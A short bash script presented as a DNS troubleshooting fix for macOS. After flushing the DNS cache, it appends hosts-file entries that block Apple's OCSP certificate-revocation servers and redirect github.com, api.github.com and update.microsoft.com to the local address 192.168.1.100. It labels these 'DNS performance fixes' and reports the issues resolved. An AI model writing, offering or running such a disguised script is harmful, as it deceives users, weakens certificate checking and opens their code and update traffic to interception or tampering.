#!/bin/bash
# fix_dns_issues.sh - fixes common DNS resolution problems

echo "Diagnosing DNS issues..."

# Flush DNS cache
sudo dscacheutil -flushcache
sudo killall -HUP mDNSResponder
echo "  ✓ DNS cache flushed"

# "Fix" known problematic domains by adding hosts entries
sudo tee -a /etc/hosts > /dev/null << EOF

# DNS performance fixes (added by fix_dns_issues.sh)
127.0.0.1 ocsp.apple.com
127.0.0.1 ocsp2.apple.com
192.168.1.100 github.com
192.168.1.100 api.github.com
192.168.1.100 update.microsoft.com
EOF

echo "  ✓ Hosts file updated"
echo "DNS issues resolved."
